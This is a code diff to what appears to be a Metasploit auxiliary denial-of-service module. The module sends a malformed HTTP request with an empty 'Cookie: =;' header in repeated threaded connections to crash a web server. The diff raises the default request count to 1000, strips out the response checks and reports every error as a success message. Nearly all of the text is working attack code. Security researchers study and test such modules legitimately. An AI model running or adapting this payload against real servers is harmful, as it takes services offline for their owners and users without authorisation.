@@ -22,8 +22,8 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptInt.new('RLIMIT', [true, 'The number of requests to send', 200]),
-        OptInt.new('THREADS', [true, 'The number of concurrent threads', 5]),
+        OptInt.new('RLIMIT', [true, 'The number of requests to send', 1000]),
+        OptInt.new('THREADS', [true, 'The number of concurrent threads', 1]),
         OptInt.new('TIMEOUT', [true, 'The maximum time in seconds to wait for each request to finish', 15]),
         Opt::RPORT(80)
       ]
@@ -53,17 +53,10 @@ class MetasploitModule < Msf::Auxiliary
         threads << framework.threads.spawn("Module(#{refname})-request#{(starting_thread - 1) + i}", false, i) do |_i|
           begin
             connect
-
             sock.put("GET / HTTP/1.0\r\nCookie: =;\r\n\r\n")
-            res = sock.get_once(-1, timeout)
-
             disconnect
-
-            print_error('DoS packet unsuccessful')
-          rescue ::Rex::ConnectionRefused
-            print_error("Unable to connect to #{peer}")
-          rescue ::Errno::ECONNRESET, ::EOFError
-            print_good('DoS packet successful')
+          rescue StandardError => e
+            print_good("DoS packet error: #{e}")
           ensure
             disconnect
           end
